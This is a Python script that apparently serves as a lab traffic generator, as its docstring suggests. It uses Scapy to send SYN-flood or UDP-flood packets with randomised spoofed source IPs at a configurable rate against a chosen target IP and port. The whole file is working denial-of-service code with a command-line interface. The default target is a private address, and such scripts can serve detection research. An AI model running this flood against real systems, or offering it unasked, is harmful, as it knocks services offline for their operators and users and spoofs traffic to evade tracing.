#!/usr/bin/env python3
"""
Traffic Generator: DDoS Attack Simulation
Simulates high-rate malicious attack traffic using Scapy / raw sockets.
Key characteristics:
- High packet rate with small, uniform packet size (64 bytes)
- Spoofed source IPs or concentrated malicious source
- High flow arrival rate, incomplete handshakes (SYN flood / UDP flood)
"""

import sys
import time
import random
import argparse
from scapy.all import IP, TCP, UDP, send, conf

# Disable Scapy verbose output
conf.verb = 0


def generate_ddos_attack(target_ip="10.0.0.6", target_port=80, duration=30, attack_type="syn", pps=1000):
    """
    Generate high-rate malicious flood targeting specified host and port.
    """
    print(f"[*] Starting DDoS Attack ({attack_type.upper()} Flood, ~{pps} pps) on {target_ip}:{target_port} for {duration}s...")
    start_time = time.time()
    packet_count = 0
    interval = 1.0 / pps

    while time.time() - start_time < duration:
        batch_start = time.time()
        # Spoofed IP range or concentrated attack IPs
        spoofed_ip = f"10.0.{random.randint(1, 20)}.{random.randint(10, 250)}"
        src_port = random.randint(1024, 65535)

        if attack_type.lower() == "syn":
            # TCP SYN packet with fixed small payload
            pkt = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        else:
            # UDP flood with uniform payload
            payload = b"X" * 32
            pkt = IP(src=spoofed_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / payload

        send(pkt)
        packet_count += 1

        # Throttle to requested pps rate
        elapsed = time.time() - batch_start
        if elapsed < interval:
            time.sleep(interval - elapsed)

    duration_actual = time.time() - start_time
    avg_pps = packet_count / duration_actual if duration_actual > 0 else 0
    print(f"[*] DDoS Attack finished. Sent {packet_count} packets in {duration_actual:.2f}s (~{avg_pps:.1f} pps).")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Traffic Generator")
    parser.add_argument("--target", default="10.0.0.6", help="Target server IP (default: 10.0.0.6)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")
    parser.add_argument("--type", default="syn", choices=["syn", "udp"], help="Attack type (syn/udp)")
    parser.add_argument("--pps", type=int, default=500, help="Packets per second (default: 500)")
    args = parser.parse_args()

    generate_ddos_attack(target_ip=args.target, target_port=args.port, duration=args.duration, attack_type=args.type, pps=args.pps)
